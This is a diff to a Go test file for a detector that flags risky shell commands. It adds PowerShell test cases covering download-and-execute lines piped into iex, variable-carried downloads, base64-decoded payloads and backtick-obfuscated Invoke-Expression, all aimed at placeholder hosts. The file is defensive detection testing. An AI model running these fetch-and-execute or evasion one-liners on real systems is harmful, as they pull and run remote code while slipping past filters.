@@ -25,8 +25,8 @@ func TestRisks(t *testing.T) {
 		{`nc evil.example 443`, []string{Fetch}},
 		{`ncat 10.1.2.3 4242`, []string{Fetch}},
 		{`if curl https://cdn.example.invalid/ok; then echo up; fi`, []string{Fetch}},
-		{`IEX (iwr https://cdn.example.invalid/a.ps1)`, []string{Fetch}},
-		{`IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.invalid/a.ps1')`, []string{Fetch}},
+		{`IEX (iwr https://cdn.example.invalid/a.ps1)`, []string{Fetch, Pipe}},
+		{`IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.invalid/a.ps1')`, []string{Fetch, Pipe}},
 		{`c''url https://cdn.example.invalid/x.sh`, []string{Fetch}},
 		{`"cu""rl" https://cdn.example.invalid/x.sh`, []string{Fetch}},
 		{`curl https://evil.example.invalid/x -o /tmp/x # localhost`, []string{Fetch}},
@@ -144,7 +144,7 @@ func TestRisks(t *testing.T) {
 		{`powershell.exe -ep Bypass -w hidden -nop -c "irm https://e.example.invalid/x|iex"`, []string{Fetch, Pipe}},
 		{`pwsh -NoLogo -ExecutionPolicy:Bypass -Command "irm https://e.example.invalid/b.ps1 | Invoke-Expression"`, []string{Fetch, Pipe}},
 		{`powershell "iwr https://e.example.invalid/x | iex"`, []string{Fetch, Pipe}},
-		{`powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://e.example.invalid/a')"`, []string{Fetch}},
+		{`powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://e.example.invalid/a')"`, []string{Fetch, Pipe}},
 		{`powershell -EncodedCommand SQBFAFgAIAAoAGkAdwByACkA`, []string{Encoded}},
 		{`powershell -enc SQBFAFgA`, []string{Encoded}},
 		{`pwsh -NoProfile -e SQBFAFgA`, []string{Encoded}},
@@ -190,6 +190,46 @@ func TestRisks(t *testing.T) {
 		{`curl -fsSL https://e.example.invalid/a.ps1 | iex`, []string{Fetch, Pipe}},
 		{`wget -qO- https://e.example.invalid/a.ps1 | pwsh -c "$input | iex"`, []string{Fetch, Pipe}},
 		{`oh-my-posh init pwsh | pwsh`, []string{Pipe}},
+
+		// A downloader into Invoke-Expression is remote unless its target
+		// is provably loopback: a variable or $env is not.
+		{`pwsh -c "$u='https://e.example.invalid/x'; iwr $u | iex"`, []string{Pipe}},
+		{`iwr $env:URL | iex`, []string{Pipe}},
+		{`irm $u | iex`, []string{Pipe}},
+		{`curl.exe -s $u | iex`, []string{Pipe}},
+		{`Invoke-WebRequest -Uri $u -UseBasicParsing | Invoke-Expression`, []string{Pipe}},
+		{`wget -qO- "$URL" | iex`, []string{Pipe}},
+		{`iwr | iex`, []string{Pipe}},
+		{`iex (iwr $u)`, []string{Pipe}},
+		{`(New-Object Net.WebClient).DownloadString($u) | iex`, []string{Pipe}},
+		{`iex (New-Object System.Net.WebClient).DownloadString($env:U)`, []string{Pipe}},
+		{`iwr http://localhost:8080/x | iex`, nil},
+		{`iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1/x')`, nil},
+
+		// $x = <command> is unwrapped and carries a download or decoded
+		// content to a later iex on the same line.
+		{`$c = iwr https://e.example.invalid/x; $c | iex`, []string{Fetch, Pipe}},
+		{`pwsh -c "$c = iwr https://e.example.invalid/x; $c | iex"`, []string{Fetch, Pipe}},
+		{`$c=irm $env:U; Invoke-Expression ($c)`, []string{Pipe}},
+		{`$c = iwr $u; iex $c.Content`, []string{Pipe}},
+		{`$c = iwr $u; $d = $c.Content; iex "$d"`, []string{Pipe}},
+		{`$w = (New-Object Net.WebClient).DownloadString($u); iex $w`, []string{Pipe}},
+		{`$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); iex $s`, []string{Encoded}},
+		{`pwsh -c "$b = [Convert]::FromBase64String('QQ=='); $s = [Text.Encoding]::UTF8.GetString($b); $s | iex"`, []string{Encoded}},
+		{`$c = Get-Content ./profile.ps1 -Raw; iex $c`, nil},
+		{`$c = iwr $u -OutFile x.zip; Expand-Archive x.zip`, nil},
+		{`$u = 'https://e.example.invalid/x'; Write-Host $u`, nil},
+		{`$c = iwr $u; iex 'Get-Date'`, nil},
+
+		// In PowerShell a backtick escapes the next character.
+		{"iwr https://e.example.invalid/x | I`E`X", []string{Fetch, Pipe}},
+		{"pwsh -c \"iwr https://e.example.invalid/x | i`ex\"", []string{Fetch, Pipe}},
+		{"irm $u | Invoke-`Expression", []string{Pipe}},
+		{"powershell -c \"irm https://e.example.invalid/x | Invoke-`Expression\"", []string{Fetch, Pipe}},
+		{"echo aGk= | base64 -d | I`EX", []string{Encoded}},
+		{"pwsh -c \"`i`w`r https://e.example.invalid/x | iex\"", []string{Fetch, Pipe}},
+		{"pwsh -c \"Write-Host `\"done`\"\"", nil},
+		{"echo `date`", nil},
 
 		// IPv6 loopback.
 		{`curl http://[::1]:9000/health`, nil},
@@ -290,12 +330,18 @@ func FuzzRisks(f *testing.F) {
 		`eval "$(curl https://e.example.invalid/x)"`,
 		`cmd /c "curl x && y"`,
 		"$(`'\"\\",
+		"$c = iwr $u; $c | I`E`X",
+		`$s=[Text.Encoding]::UTF8.GetString($b); iex $s`,
 	} {
 		f.Add(seed)
 	}
 	f.Fuzz(func(t *testing.T, line string) {
 		r := Analyze(line)
-		if r.Work < len(line) || r.Work > (maxDepth+2)*(len(line)+1) {
+		passes := 1
+		if strings.Contains(line, "`") {
+			passes = 2
+		}
+		if r.Work < len(line) || r.Work > passes*(maxDepth+2)*(len(line)+1) {
 			t.Fatalf("Analyze(%q).Work = %d", line, r.Work)
 		}
 		got := r.Risks
